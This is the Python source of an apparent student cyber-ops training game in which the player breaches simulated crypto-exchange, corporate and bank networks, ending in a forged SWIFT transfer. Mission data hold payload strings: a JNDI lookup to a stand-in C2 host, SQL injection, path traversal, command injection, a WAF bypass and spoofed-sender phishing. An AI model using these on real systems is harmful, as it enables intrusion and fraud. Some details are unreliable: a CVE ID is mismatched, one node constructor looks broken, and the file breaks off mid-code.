"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  GHOST PROTOCOL: CYBER OPS  v2.0                                            ║
║  Продвинутый тренажёр по кибербезопасности с мультиагентным ИИ             ║
║  Гелич К.А.  |  КЕМ-25-01  |  РГУ нефти и газа (НИУ) им. И.М. Губкина     ║
╚══════════════════════════════════════════════════════════════════════════════╝
  Стек: Python 3.11 · Pygame 2.x · Requests · python-dotenv

  УСТАНОВКА:
      pip install pygame requests python-dotenv

  КОНФИГУРАЦИЯ (.env рядом с main.py):
      AI_PROVIDER=claude          ← или qwen / openai
      ANTHROPIC_API_KEY=sk-ant-...   ← Claude (Anthropic)
      DASHSCOPE_API_KEY=sk-...       ← Qwen  (Alibaba)
      OPENAI_API_KEY=sk-...          ← OpenAI / совместимый

  УПРАВЛЕНИЕ:
      ЛКМ      — нажатие кнопок / выбор узла на карте
      Enter    — выполнить команду
      ↑  ↓     — история команд
      Tab      — автодополнение
      ESC      — вернуться в меню
"""
import pygame, sys, time, threading, os, random, math, requests, json
from dataclasses import dataclass, field
from typing import Optional, Callable, Dict, List, Tuple
from enum import Enum, auto

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

# ════════════════════════════════════════════════════════════════════════════
#  РАЗМЕРЫ И ЗОНЫ ЭКРАНА
# ════════════════════════════════════════════════════════════════════════════
SW, SH = 1400, 820
FPS    = 60

# Три панели игрового экрана
NET_W  = 360    # ширина: карта сети
TERM_W = 660    # ширина: терминал
HUD_W  = 380    # ширина: HUD / статус

NET_R  = pygame.Rect(0,        0, NET_W,  SH)
TERM_R = pygame.Rect(NET_W,    0, TERM_W, SH)
HUD_R  = pygame.Rect(NET_W+TERM_W, 0, HUD_W, SH)

# ════════════════════════════════════════════════════════════════════════════
#  ЦВЕТОВАЯ ПАЛИТРА (Cyberpunk)
# ════════════════════════════════════════════════════════════════════════════
C_BG      = (3,   6,  14)
C_PANEL   = (7,  13,  28)
C_PANEL2  = (11, 19,  40)
C_BORDER  = (0,  65, 140)
C_BORDH   = (0, 140, 255)   # highlighted border

C_GREEN   = (0, 255, 120)
C_DKGREEN = (0,  50,  25)
C_CYAN    = (0, 210, 255)
C_BLUE    = (50, 120, 255)
C_RED     = (255,  40,  60)
C_DKRED   = (100,  12,  20)
C_YELLOW  = (255, 200,   0)
C_ORANGE  = (255, 120,   0)
C_PURPLE  = (160,  40, 255)
C_MAGENTA = (255,  40, 200)
C_WHITE   = (220, 235, 255)
C_GRAY    = (75,  95, 125)
C_DKGRAY  = (22,  32,  52)

# DEFCON-система
DEFCON_COL  = {0:(0,200,80), 1:(180,180,0), 2:(220,120,0), 3:(220,40,40), 4:(255,0,40)}
DEFCON_NAME = {0:"DEFCON 5", 1:"DEFCON 4", 2:"DEFCON 3", 3:"DEFCON 2", 4:"DEFCON 1"}
DEFCON_MSG  = {0:"ALL CLEAR", 1:"ELEVATED", 2:"DETECTED", 3:"ACTIVE HUNT", 4:"LOCKDOWN"}

# Цвета узлов сети
NCOLOR = {
    "unknown":    (45, 55, 75),
    "accessible": (25, 70, 155),
    "scanned":    (140, 120,  0),
    "owned":      (0,  140,  60),
    "honeypot":   (150,  15,  25),
    "target":     (130,  30, 160),
}
NTCOLOR = {
    "unknown":    (90, 110, 145),
    "accessible": (70, 150, 255),
    "scanned":    (255, 215,  40),
    "owned":      (0,  255, 128),
    "honeypot":   (255,  70,  90),
    "target":     (200, 100, 255),
}

# Цвета строк терминала
TC = {
    "cmd":     C_GREEN,
    "ok":      C_GREEN,
    "info":    C_CYAN,
    "warn":    C_YELLOW,
    "err":     C_RED,
    "data":    (180, 210, 255),
    "oracle":  (140, 255, 180),
    "sentinel":(255, 100, 120),
    "system":  C_GRAY,
    "header":  C_MAGENTA,
    "bar":     C_BLUE,
}

# ════════════════════════════════════════════════════════════════════════════
#  ПЕРЕЧИСЛЕНИЯ
# ════════════════════════════════════════════════════════════════════════════
class Phase(Enum):
    BOOT   = auto(); MENU   = auto(); BRIEFING = auto()
    PLAY   = auto(); SKILLS = auto(); DEBRIEF  = auto()

class NodeSt(Enum):
    UNKNOWN    = "unknown"
    ACCESSIBLE = "accessible"
    SCANNED    = "scanned"
    OWNED      = "owned"
    HONEYPOT   = "honeypot"

# ════════════════════════════════════════════════════════════════════════════
#  DATACLASSES
# ════════════════════════════════════════════════════════════════════════════
@dataclass
class Vuln:
    vid:        str
    name:       str
    cve:        str
    difficulty: float       # 0.0 – 1.0
    detect:     float       # DEFCON прирост при использовании
    desc:       str
    cmd_hint:   str
    technique:  str         # "remote_exploit" | "sqli" | "social" | "brute"
    success_lines: List[str] = field(default_factory=list)

@dataclass
class NetNode:
    nid:         str
    label:       str
    ip:          str
    os_info:     str
    pos:         Tuple[float, float]   # 0.0–1.0 в пределах NET_R
    connections: List[str]             # nid соседей
    vulns:       List[Vuln]
    files:       Dict[str, str]        # имя файла → краткое описание
    state:       NodeSt = NodeSt.UNKNOWN
    is_entry:    bool = False
    is_objective: bool = False
    is_honeypot: bool = False
    backdoor:    bool = False
    downloaded:  set  = field(default_factory=set)

@dataclass
class Objective:
    oid:     str
    text:    str
    node_id: str
    action:  str   # "own" | "exfil" | "cover" | "backdoor"
    done:    bool = False

@dataclass
class Mission:
    mid:          str
    name:         str
    codename:     str
    target_org:   str
    difficulty:   str          # "★" | "★★" | "★★★"
    briefing:     str
    nodes:        Dict[str, NetNode]
    objectives:   List[Objective]
    reward_cr:    int
    reward_sp:    int
    time_limit:   int = 0      # сек, 0 = без лимита
    oracle_sys:   str = ""     # системный промпт ORACLE
    sentinel_sys: str = ""     # системный промпт SENTINEL

@dataclass
class Skill:
    sid:     str
    name:    str
    branch:  str         # "GHOST" | "ZERO" | "ORACLE"
    icon:    str
    desc:    str
    cost:    int
    pos:     Tuple[float, float]   # позиция в дереве 0-1
    requires: List[str] = field(default_factory=list)  # sid зависимостей
    # эффекты
    hack_bonus:    float = 0.0
    stealth_bonus: float = 0.0
    social_bonus:  float = 0.0
    special:       str   = ""     # special ability key
    unlocked: bool = False

@dataclass
class Particle:
    x: float; y: float
    vx: float; vy: float
    life: float; max_life: float
    color: Tuple[int,int,int]
    size: float

# ════════════════════════════════════════════════════════════════════════════
#  ДАННЫЕ МИССИЙ
# ════════════════════════════════════════════════════════════════════════════
def make_missions() -> Dict[str, Mission]:
    # ── МИССИЯ 1: COLD BOOT ──────────────────────────────────────────────
    m1_nodes = {
        "entry": NetNode("entry", "ENTRY-POINT", "89.45.112.1", "nginx/1.18",
            (0.5, 0.08), ["webapp"], [], {}, NodeSt.ACCESSIBLE, is_entry=True),

        "webapp": NetNode("webapp", "WEB-APP", "10.0.1.10", "Apache 2.4.49 / PHP 8.0",
            (0.25, 0.35), ["entry","cache","db"],
            [Vuln("sqli","SQL Injection","CVE-2021-44228",0.25, 0.08,
                "Уязвимый параметр id= в форме авторизации",
                "exploit sqli → ' OR 1=1--","sqli",
                ["[*] Формируем payload: ' OR 1=1 LIMIT 1--",
                 "[*] Обход фильтра WAF... успешно",
                 "[+] Получен доступ к БД: cryptoex_users",
                 "[+] Дамп таблицы sessions: 4 832 записи",
                 "[+] Найдены API-ключи бирже: 3 шт."]),
             Vuln("rce","RCE: Log4Shell","CVE-2021-44228",0.40, 0.14,
                "Уязвимость в log4j — JNDI lookup через заголовок X-Api-Version",
                "exploit rce → X-Api-Version: ${jndi:ldap://c2/shell}","remote_exploit",
                ["[*] Внедряем JNDI lookup в X-Api-Version...",
                 "[*] Ожидание callback от 10.0.1.10:1389...",
                 "[+] Получен reverse shell: UID=www-data",
                 "[*] Privesc через sudo misconfiguration...",
                 "[+] ROOT ACCESS — uid=0(root)"])],
            {"api_keys.txt":"API-ключи торговых ботов","auth_log":"Лог авторизаций за 30д"},
            is_objective=True),

        "cache": NetNode("cache", "REDIS-CACHE", "10.0.1.11", "Redis 6.2 (no-auth)",
            (0.75, 0.35), ["webapp","coldstore"],
            [Vuln("noauth","Redis Unauth RCE","CVE-2022-0543",0.20, 0.05,
                "Redis запущен без пароля, bind 0.0.0.0",
                "exploit noauth → redis-cli CONFIG SET dir /tmp","remote_exploit",
                ["[*] Подключение к Redis: 10.0.1.11:6379 (без auth)",
                 "[*] CONFIG SET dir /var/spool/cron/crontabs/",
                 "[*] SET payload с reverse shell...",
                 "[+] Cron-задача установлена",
                 "[+] REDIS-CACHE СКОМПРОМЕТИРОВАН"])],
            {"sessions.rdb":"Дамп активных сессий","config":"Конфиг Redis с путями"},),

        "db": NetNode("db", "DB-PRIMARY", "10.0.1.20", "PostgreSQL 13.4",
            (0.25, 0.65), ["webapp","coldstore"],
            [Vuln("pgpriv","PG Privilege Esc","CVE-2023-2454",0.55, 0.12,
                "Уязвимость CREATE SCHEMA в PostgreSQL 13",
                "exploit pgpriv → CREATE SCHEMA evil;","sqli",
                ["[*] Подключение к PostgreSQL через найденные credentials...",
                 "[*] Эксплуатация CVE-2023-2454 (schema injection)...",
                 "[+] Superuser privileges получены",
                 "[+] Дамп таблицы wallets: 12 441 запись"])],
            {"wallets.sql":"Таблица адресов и балансов","private_keys.enc":"Зашифрованные приватные ключи"},
            is_objective=True),

        "honeypot": NetNode("honeypot","BACKUP-SRV","10.0.1.99","Windows Server 2019",
            (0.75, 0.65), ["cache"],
            [Vuln("ms17","EternalBlue","MS17-010",0.10, 0.45,
                "Намеренно уязвимый сервер — приманка SOC",
                "exploit ms17","remote_exploit",
                ["[!] ЛОВУШКА! HONEYPOT активирован",
                 "[!] SOC-оповещение отправлено администратору",
                 "[!] Ваш IP занесён в blacklist",
                 "[SENTINEL] Цель поймана в приманку. Отличная работа, ребята."])],
            {}, is_honeypot=True),

        "coldstore": NetNode("coldstore","COLD-VAULT","10.0.1.50","Air-gapped HSM",
            (0.5, 0.85), ["cache","db"],
            [Vuln("hsm","HSM Firmware Exploit","CVE-2024-0987",0.70, 0.20,
                "Уязвимость прошивки HSM — бэкдор вендора",
                "exploit hsm → firmware_patch.bin","remote_exploit",
                ["[*] Анализ прошивки HSM Thales Luna...",
                 "[*] Загрузка вредоносного патча...",
                 "[*] Перезапись секций EEPROM...",
                 "[+] HSM разблокирован!",
                 "[+] Извлечено приватных ключей: 847 BTC (~$38 000 000)"])],
            {"cold_keys.bin":"Приватные ключи холодного кошелька (847 BTC)",
             "seed_phrase.enc":"Зашифрованная seed-фраза"},
            is_objective=True),
    }
    m1_obj = [
        Objective("o1","Скомпрометировать WEB-APP","webapp","own"),
        Objective("o2","Экcфильтровать данные из DB-PRIMARY","db","exfil"),
        Objective("o3","Вскрыть COLD-VAULT и забрать ключи","coldstore","exfil"),
    ]

    # ── МИССИЯ 2: PHANTOM SIGNAL ─────────────────────────────────────────
    m2_nodes = {
        "fw": NetNode("fw","PERIMETER-FW","185.22.70.1","Fortinet FortiGate 7.0",
            (0.5, 0.06), ["dmz_web"],
            [Vuln("fwbyp","FortiGate SSL-VPN RCE","CVE-2023-27997",0.35, 0.10,
                "Heap overflow в SSL-VPN без аутентификации",
                "exploit fwbyp → crafted_tls_hello.bin","remote_exploit",
                ["[*] Отправка вредоносного TLS ClientHello...",
                 "[*] Heap-spray в SSL-VPN worker process...",
                 "[+] RCE на FortiGate — uid=root",
                 "[+] Firewall правила: ИЗМЕНЕНЫ (разрешён туннель C2)"])],
            {}),

        "dmz_web": NetNode("dmz_web","DMZ-WEB","10.10.1.5","WordPress 6.1 / PHP 8.1",
            (0.3, 0.25), ["fw","mail","dev"],
            [Vuln("wp","WP Plugin RCE","CVE-2023-3936",0.30, 0.08,
                "Уязвимый плагин Contact Form 7 (6.3M установок)",
                "exploit wp → multipart/form-data","remote_exploit",
                ["[*] Загрузка PHP web shell через CF7...",
                 "[+] Web shell активен: /wp-content/uploads/a.php",
                 "[+] DMZ-WEB СКОМПРОМЕТИРОВАН"])],
            {"readme.html":"Версия WordPress", "wp-config.php":"DB credentials (частично)"}),

        "mail": NetNode("mail","MAIL-SRV","10.10.1.8","MS Exchange 2019",
            (0.7, 0.25), ["fw","dmz_web","dev"],
            [Vuln("phish","Целевой фишинг","SOCIAL-001",0.20, 0.04,
                "Письмо от 'IT-отдела' с вредоносным документом",
                "social phish → письмо CTO megacorp","social",
                ["[*] Формируем spear-phishing письмо для CTO...",
                 "[*] Вложение: Q4_Budget_Review.docx (macro payload)",
                 "[*] Письмо отправлено: cto@megacorp.ru",
                 "[+] Макрос исполнен на рабочей станции CTO",
                 "[+] Получен meterpreter: 10.10.2.5 (CTO-WORKSTATION)"])],
            {"mail_archive.pst":"PST-архив переписки за 2024","contacts.vcf":"Адресная книга"}),

        "dev": NetNode("dev","DEV-NETWORK","10.10.2.0/24","Internal LAN",
            (0.5, 0.45), ["dmz_web","mail","git","hr","siem"],
            [], {"network_map.pdf":"Схема внутренней сети"},),

        "git": NetNode("git","GIT-REPO","10.10.2.10","GitLab CE 15.9",
            (0.2, 0.65), ["dev"],
            [Vuln("gitleak","GitLab Path Traversal","CVE-2023-2825",0.25, 0.07,
                "Path traversal в GitLab CE <= 15.11",
                "exploit gitleak → /../../../etc/passwd","sqli",
                ["[*] GET /api/v4/projects/../../../etc/passwd HTTP/1.1",
                 "[+] Чтение файлов за пределами root...",
                 "[+] Найдены hardcoded secrets в репозитории ai_model",
                 "[+] AWS_SECRET_KEY: AKIAIOSFODNN7EXAMPLE",
                 "[+] DB_PASSWORD: Sup3rS3cr3t2024!"])],
            {"ai_model/config.py":"Конфиг модели (API keys)","secrets.env":"Секреты CI/CD"},
            is_objective=True),

        "hr": NetNode("hr","HR-SERVER","10.10.2.15","SAP HCM 7.5",
            (0.5, 0.65), ["dev"],
            [Vuln("sap","SAP SOAP RCE","CVE-2022-22536",0.45, 0.12,
                "HTTP Request Smuggling в SAP ICM",
                "exploit sap → smuggled_request.bin","remote_exploit",
                ["[*] HTTP Request Smuggling на SAP ICM...",
                 "[*] Десинхронизация TLS-туннеля...",
                 "[+] RCE на SAP HCM — uid=<SAP>",
                 "[+] Получены личные данные 4200 сотрудников"])],
            {"employees.csv":"ФИО, должности, зарплаты","org_chart.pdf":"Оргструктура компании"}),

        "siem": NetNode("siem","SIEM-MONITOR","10.10.2.50","Splunk Enterprise 9.0",
            (0.8, 0.65), ["dev","ai_lab"],
            [Vuln("splunk","Splunk RCE (admin)","CVE-2023-46214",0.50, 0.15,
                "XSLT injection в Splunk — требует admin creds",
                "exploit splunk → xslt_payload.xml","remote_exploit",
                ["[*] Загрузка вредоносного XSLT в Splunk...",
                 "[*] Исполнение через searchProcessingLanguage...",
                 "[+] RCE: uid=splunk",
                 "[+] SIEM ОТКЛЮЧЁН — алерты заблокированы на 60 сек"])],
            {"alerts.log":"Все сработавшие алерты","dashboards":"Дашборды мониторинга"},),

        "ai_lab": NetNode("ai_lab","AI-RESEARCH","10.10.3.1","Ubuntu 22.04 / CUDA",
            (0.5, 0.85), ["siem","git"],
            [Vuln("nfs","NFS mis-export","CVE-2022-0185",0.35, 0.09,
                "NFS-шара /data/models экспортирована без ограничений",
                "exploit nfs → mount -t nfs 10.10.3.1:/data /mnt","remote_exploit",
                ["[*] showmount -e 10.10.3.1 → /data/models (everyone)",
                 "[*] Монтирование NFS-шары...",
                 "[+] Доступ к /data/models: 847 GB",
                 "[+] Найдена модель MegaLLM-70B (proprietary)"])],
            {"MegaLLM-70B.weights":"Веса проприетарной ИИ-модели (847GB)",
             "training_data.tar":"Обучающие данные (конфиденциально)"},
            is_objective=True),
    }
    m2_obj = [
        Objective("o1","Проникнуть в DEV-NETWORK","dev","own"),
        Objective("o2","Похитить секреты из GIT-REPO","git","exfil"),
        Objective("o3","Отключить SIEM-мониторинг","siem","own"),
        Objective("o4","Экcфильтровать веса ИИ-модели из AI-RESEARCH","ai_lab","exfil"),
    ]

    # ── МИССИЯ 3: ZERO HOUR ──────────────────────────────────────────────
    m3_nodes = {
        "inet": NetNode("inet","INTERNET","0.0.0.0","Open","(0.5,0.05)",
            (0.5, 0.05), ["proxy"],[], {}, NodeSt.ACCESSIBLE, is_entry=True),

        "proxy": NetNode("proxy","REVERSE-PROXY","195.18.45.1","HAProxy 2.6",
            (0.5, 0.18), ["inet","waf","mail_gw"],
            [Vuln("haproxy","HAProxy HTTP Desynch","CVE-2023-45539",0.30, 0.07,
                "HTTP request smuggling через Content-Length + Transfer-Encoding",
                "exploit haproxy","remote_exploit",
                ["[*] Формируем CL.TE smuggled request...",
                 "[*] Яд в буфере HAProxy...",
                 "[+] Туннель в backend: 10.20.0.0/16"])],
            {}),

        "waf": NetNode("waf","WEB-APP-FW","10.20.0.1","ModSecurity 3.0",
            (0.25, 0.32), ["proxy","webportal"],
            [Vuln("wafbyp","WAF Bypass via Encoding","WAF-BYPASS",0.20, 0.05,
                "Обход ModSecurity через nested URL-encoding",
                "exploit wafbyp → %%2527 OR 1=1--","sqli",
                ["[*] Тест базовых WAF-правил...",
                 "[*] Попытка unicode normalization bypass...",
                 "[*] Double URL encoding: %%2527 → обход!",
                 "[+] WAF ОБОЙДЁН — прямой доступ к backend"])],
            {}),

        "mail_gw": NetNode("mail_gw","MAIL-GATEWAY","10.20.0.5","Postfix / SpamAssassin",
            (0.75, 0.32), ["proxy","intranet"],
            [Vuln("phish_bank","Банковский фишинг","SOCIAL-002",0.15, 0.03,
                "Письмо 'ЦБРФ: срочная проверка' сотруднику операционного отдела",
                "social phish_bank → oper@statebank.ru","social",
                ["[*] Создание фишингового домена: cbrf-secure.ru",
                 "[*] SPF/DKIM spoofing: From: security@cbrf.ru",
                 "[*] Письмо отправлено: oper@statebank.ru",
                 "[+] Сотрудник перешёл по ссылке — credentials украдены",
                 "[+] Учётные данные: oper_petrov / Qwerty2024!"])],
            {"mail_queue.log":"Очередь входящей почты"}),

        "webportal": NetNode("webportal","WEB-PORTAL","10.20.1.1","Oracle WebLogic 14",
            (0.25, 0.50), ["waf","intranet"],
            [Vuln("weblogic","WebLogic T3 Deserialization","CVE-2023-21839",0.40, 0.12,
                "Java deserialization через T3-протокол WebLogic",
                "exploit weblogic → ysoserial CommonsCollections6","remote_exploit",
                ["[*] Отправка T3 handshake на :7001...",
                 "[*] Полезная нагрузка: ysoserial CommonsCollections6",
                 "[*] Десериализация... выполнение кода...",
                 "[+] RCE на WebLogic — uid=oracle",
                 "[+] Получены credentials к СУБД"])],
            {"portal_config.xml":"Конфиг портала с DB credentials","users.xml":"Список пользователей"}),

        "intranet": NetNode("intranet","INTRANET-CORE","10.20.2.0/22","Internal backbone",
            (0.5, 0.50), ["mail_gw","webportal","corebank","security","swift_prep"],
            [],{"network_diagram.vsd":"Актуальная топология сети"}),

        "security": NetNode("security","SOC-MONITOR","10.20.2.10","IBM QRadar 7.5",
            (0.8, 0.65), ["intranet"],
            [Vuln("qradar","QRadar RCE (auth)","CVE-2023-37032",0.45, 0.15,
                "Command injection в QRadar через authenticated API endpoint",
                "exploit qradar → ';sleep 30;'","remote_exploit",
                ["[*] Используем похищенные admin credentials QRadar...",
                 "[*] Инъекция команды в /api/asset_model/assets...",
                 "[+] RCE: uid=nobody",
                 "[+] SOC-мониторинг ОТКЛЮЧЁН на 90 секунд",
                 "[!] Это даст вам окно для финального удара — действуйте быстро"])],
            {"incidents.log":"Все инциденты за квартал","correlation_rules":"Правила корреляции SIEM"},
            is_objective=True),

        "corebank": NetNode("corebank","CORE-BANKING","10.20.3.1","IBM Z15 / z/OS",
            (0.25, 0.80), ["intranet","swift_prep"],
            [Vuln("zos","z/OS RACF Bypass","CVE-2024-1337",0.65, 0.18,
                "Обход RACF через APF-авторизацию при переполнении буфера SVC",
                "exploit zos → svc_overflow.rexx","remote_exploit",
                ["[*] Компиляция REXX exploit для z/OS SVC...",
                 "[*] APF-авторизация: 32 → 0 (bypass)...",
                 "[+] RACF bypass: uid=IBMUSER (admin)",
                 "[+] CORE-BANKING СКОМПРОМЕТИРОВАН",
                 "[+] Доступ к счетам: 4 200 000 клиентов"])],
            {"accounts.dat":"Данные счетов 4.2M клиентов","routing_keys":"Ключи межбанковских переводов"},
            is_objective=True),

        "swift_prep": NetNode("swift_prep","SWIFT-TERMINAL","10.20.3.5","SWIFT Alliance Access 7.4",
            (0.5, 0.80), ["intranet","corebank"],
            [Vuln("swift_msg","SWIFT MT103 Injection","SWIFT-001",0.70, 0.22,
                "Модификация SWIFT MT103 сообщения о переводе",
                "exploit swift_msg → mt103_forge.py","remote_exploit",
                ["[*] Подключение к SWIFT Alliance через краденные HSM-ключи...",
                 "[*] Формирование MT103: BENEFICIARY: GHOST-LLC",
                 "[*] AMOUNT: USD 47,500,000",
                 "[*] Подпись транзакции украденным ключом...",
                 "[+] SWIFT MT103 отправлен в Deutsche Bank Frankfurt",
                 "[+] Подтверждение: TX#20241107GHOSTXX1234567890",
                 "[+] МИССИЯ ВЫПОЛНЕНА — $47.5M переведено"])],
            {"swift_keys.bin":"HSM-ключи для подписи SWIFT","mt103_template.swift":"Шаблон перевода"},
            is_objective=True),
    }
    m3_obj = [
        Objective("o1","Проникнуть в INTRANET-CORE","intranet","own"),
        Objective("o2","Отключить SOC-мониторинг","security","own"),
        Objective("o3","Скомпрометировать CORE-BANKING","corebank","own"),
        Objective("o4","Выполнить SWIFT-перевод $47.5M","swift_prep","exfil"),
    ]

    oracle1 = (
        "Ты ORACLE — ИИ-хендлер элитного хакера в кибертренажёре. "
        "Операция: COLD BOOT. Цель: криптобиржа CryptoEx. "
        "Говори кратко, профессионально, как оперативный офицер. Дай 1-2 предложения. "
        "Не раскрывай реальных методов взлома. Контекст: учебная симуляция."
    )
    sentinel1 = (
        "Ты SENTINEL — ИИ системы безопасности CryptoEx в кибертренажёре. "
        "Реагируй на обнаруженные угрозы коротко и угрожающе (1-2 предложения). "
        "Ты знаешь, что тебя взламывают, но не знаешь кто. Говори от лица системы."
    )
    oracle2 = (
        "Ты ORACLE — хендлер в кибертренажёре. Операция PHANTOM SIGNAL: MegaCorp R&D. "
        "Цели: секреты Git-репозитория и веса проприетарной ИИ-модели. "
        "Отвечай как тактический советник, 1-2 предложения. Контекст: учебная симуляция."
    )
    oracle3 = (
        "Ты ORACLE — хендлер в кибертренажёре. Операция ZERO HOUR: государственный банк. "
        "Финальная миссия. Цель — SWIFT-перевод на $47.5M. Время критично. "
        "Говори напряжённо и по делу, 1-2 предложения. Учебная симуляция ИБ."
    )

    return {
        "m1": Mission("m1","COLD BOOT","ОПЕРАЦИЯ: COLD BOOT",
            "CryptoEx Exchange (RU)","★","10.0.1.0/24",
            m1_nodes, m1_obj, 12000, 2, time_limit=0,
            oracle_sys=oracle1, sentinel_sys=sentinel1),
        "m2": Mission("m2","PHANTOM SIGNAL","ОПЕРАЦИЯ: PHANTOM SIGNAL",
            "MegaCorp R&D Division","★★","10.10.0.0/16",
            m2_nodes, m2_obj, 35000, 3, time_limit=0, oracle_sys=oracle2),
        "m3": Mission("m3","ZERO HOUR","ОПЕРАЦИЯ: ZERO HOUR",
            "StateBank (ГосБанк РФ)","★★★","10.20.0.0/14",
            m3_nodes, m3_obj, 100000, 5, time_limit=0, oracle_sys=oracle3),
    }

# ════════════════════════════════════════════════════════════════════════════
#  ДАННЫЕ НАВЫКОВ (SkillTree)
# ════════════════════════════════════════════════════════════════════════════
SKILLS_DATA: List[Skill] = [
    # GHOST branch — скрытность
    Skill("ghost_1","Ghost Step","GHOST","👣",
        "Базовый уровень: −15% к обнаружению при всех атаках",1,(0.5,0.15),
        stealth_bonus=0.15),
    Skill("ghost_2","Phantom OS","GHOST","🌫",
        "Работа через Whonix: −25% обнаружение (требует Ghost Step)",2,(0.3,0.40),
        ["ghost_1"], stealth_bonus=0.25),
    Skill("ghost_3","Log Wiper","GHOST","🧹",
        "cover очищает логи на 2 соседних узла одновременно",2,(0.7,0.40),
        ["ghost_1"], special="multi_cover"),
    Skill("ghost_4","Dark Matter","GHOST","🕳",
        "Один раз за миссию: полное исчезновение (DEFCON→4→2)",3,(0.5,0.65),
        ["ghost_2","ghost_3"], special="escape_once"),

    # ZERO branch — эксплуатация
    Skill("zero_1","Stack Smasher","ZERO","💣",
        "+20% к шансу успешного exploit на всех узлах",1,(0.5,0.15),
        hack_bonus=0.20),
    Skill("zero_2","Zero Day Pack","ZERO","📦",
        "Открывает 2 дополнительных 0-day (super_exploit)",2,(0.3,0.40),
        ["zero_1"], special="zero_day"),
    Skill("zero_3","Kernel Mode","ZERO","⚙",
        "После успешного exploit: автоматическая эскалация до root",2,(0.7,0.40),
        ["zero_1"], special="auto_root"),
    Skill("zero_4","God Mode","ZERO","👁",
        "Финальный навык: один узел уничтожается с DEFCON-сбросом к 0",3,(0.5,0.65),
        ["zero_2","zero_3"], special="god_mode"),

    # ORACLE branch — социальная инженерия / ИИ
    Skill("oracle_1","Open Source Int","ORACLE","🔍",
        "scan показывает файлы и тип ОС до компрометации",1,(0.5,0.15),
        social_bonus=0.10),
    Skill("oracle_2","Deep Fake Voice","ORACLE","🎭",
        "+30% к успеху social-атак и фишинга",2,(0.3,0.40),
        ["oracle_1"], social_bonus=0.30),
    Skill("oracle_3","Psych Profile","ORACLE","🧠",
        "oracle команда даёт детальный план следующих 3 шагов",2,(0.7,0.40),
        ["oracle_1"], special="deep_hint"),
    Skill("oracle_4","Puppet Master","ORACLE","🪡",
        "social-атака может полностью отключить SENTINEL на 120 сек",3,(0.5,0.65),
        ["oracle_2","oracle_3"], special="silence_sentinel"),
]

# ════════════════════════════════════════════════════════════════════════════
#  EVENT BUS
# ════════════════════════════════════════════════════════════════════════════
class EventBus:
    _l: Dict[str, List[Callable]] = {}
    @classmethod
    def sub(cls, ev, cb):
        cls._l.setdefault(ev, [])
        if cb not in cls._l[ev]: cls._l[ev].append(cb)
    @classmethod
    def pub(cls, ev, data=None):
        for cb in list(cls._l.get(ev, [])): cb(data)
    @classmethod
    def clear(cls): cls._l.clear()

# ════════════════════════════════════════════════════════════════════════════
#  SINGLETON META
# ════════════════════════════════════════════════════════════════════════════
class _SM(type):
    _i: Dict = {}
    def __call__(cls, *a, **kw):
        if cls not in cls._i: cls._i[cls] = super().__call__(*a, **kw)
        return cls._i[cls]

# ════════════════════════════════════════════════════════════════════════════
#  AI MANAGER — поддержка Claude / Qwen / OpenAI
# ════════════════════════════════════════════════════════════════════════════
class AIManager(metaclass=_SM):
    def __init__(self):
        self.provider = os.getenv("AI_PROVIDER","openai").lower()
        self.key_cl   = os.getenv("ANTHROPIC_API_KEY","")
        self.key_qw   = os.getenv("DASHSCOPE_API_KEY","")
        self.key_oa   = os.getenv("OPENAI_API_KEY","")
        self.oracle_hist: List[Dict] = []
        self.sent_hist:   List[Dict] = []
        self.oracle_sys   = ""
        self.sentinel_sys = ""
        self.sentinel_silenced = 0.0   # timestamp до которого SENTINEL молчит

    def set_mission(self, m: Mission):
        self.oracle_sys   = m.oracle_sys or \
            "Ты ORACLE — ИИ-хендлер хакера в кибертренажёре. Отвечай кратко (1-2 предл.). Учебная симуляция."
        self.sentinel_sys = m.sentinel_sys or \
            "Ты SENTINEL — ИИ системы безопасности. Реагируй угрожающе, 1-2 предложения."
        self.oracle_hist   = []
        self.sent_hist     = []

    @property
    def available(self):
        if self.provider == "claude":  return bool(self.key_cl)
        if self.provider == "qwen":    return bool(self.key_qw)
        return bool(self.key_oa)

    def _send(self, system, history, prompt, callback, max_tokens=180):
        messages = history + [{"role":"user","content":prompt}]
        try:
            if self.provider == "claude":
                r = requests.post("https://api.anthropic.com/v1/messages",
                    headers={"x-api-key":self.key_cl,"anthropic-version":"2023-06-01","content-type":"application/json"},
                    json={"model":"claude-opus-4-5","max_tokens":max_tokens,"system":system,"messages":messages},
                    timeout=15)
                text = r.json()["content"][0]["text"]
            elif self.provider == "qwen":
                r = requests.post("https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions",
                    headers={"Authorization":f"Bearer {self.key_qw}","Content-Type":"application/json"},
                    json={"model":"qwen-plus","max_tokens":max_tokens,
                          "messages":[{"role":"system","content":system}]+messages},
                    timeout=15)
                text = r.json()["choices"][0]["message"]["content"]
            else:   # openai
                r = requests.post("https://api.openai.com/v1/chat/completions",
                    headers={"Authorization":f"Bearer {self.key_oa}","Content-Type":"application/json"},
                    json={"model":"gpt-4o-mini","max_tokens":max_tokens,
                          "messages":[{"role":"system","content":system}]+messages},
                    timeout=15)
                text = r.json()["choices"][0]["message"]["content"]
            history.append({"role":"user","content":prompt})
            history.append({"role":"assistant","content":text})
            if len(history) > 20: history[:] = history[-20:]
            callback(text)
        except Exception as e:
            callback(f"[АИ-ошибка: {e}]")

    def oracle(self, prompt: str, cb: Callable):
        if not self.available:
            cb("[ORACLE отключён — нет API-ключа в .env]"); return
        threading.Thread(target=self._send,
            args=(self.oracle_sys, self.oracle_hist, prompt, cb), daemon=True).start()

    def sentinel(self, prompt: str, cb: Callable):
        if not self.available: cb("[SENTINEL: угрозы обнаружены. Протоколы активированы.]"); return
        if time.time() < self.sentinel_silenced: cb("[SENTINEL: ...offline...]"); return
        threading.Thread(target=self._send,
            args=(self.sentinel_sys, self.sent_hist, prompt, cb), daemon=True).start()

# ════════════════════════════════════════════════════════════════════════════
#  GAME MANAGER
# ════════════════════════════════════════════════════════════════════════════
class GameManager(metaclass=_SM):
    def __init__(self):
        self.phase       = Phase.BOOT
        self.running     = True
        self.credits     = 0
        self.skill_pts   = 2           # начальные SP
        self.missions    = make_missions()
        self.completed_m : List[str] = []
        self.active_mid  : Optional[str] = None
        self.defcon      = 0           # 0-4 (0=DEFCON5, 4=DEFCON1)
        self.detect_rate = 0.0         # 0.0-1.0
        self.skills: List[Skill] = [s.__class__(**vars(s)) for s in SKILLS_DATA]
        # копируем дефолтные навыки
        self.skills = []
        for s in SKILLS_DATA:
            self.skills.append(Skill(
